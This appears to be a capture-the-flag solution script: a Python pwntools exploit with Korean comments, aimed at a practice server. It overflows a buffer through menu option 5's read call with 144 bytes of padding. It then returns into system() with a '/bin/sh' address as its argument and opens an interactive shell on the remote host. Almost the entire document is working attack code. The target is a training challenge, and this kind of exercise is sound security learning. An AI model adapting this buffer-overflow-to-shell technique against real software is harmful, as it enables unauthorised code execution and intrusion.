from pwn import *

r =remote("ctf.j0n9hyun.xyz", 3010)

pr = 0x8048545
system = 0x80485b0
binsh = 0x8048eb1

sleep(0.1)

r.recvuntil(">>> ")
r.sendline("5")
r.recvuntil(" > ")

# 5번에서 read함수 취약점이 발견됨!
payload = b"A" * 144 # 입력받을 buf(0x8c) + sfp(4)
payload += p32(system) # system 주소 값 (return)
payload += p32(pr) # system 나중 return
payload += p32(binsh) # system의 1번째 인자

print(payload)
r.sendline(payload)

r.interactive()
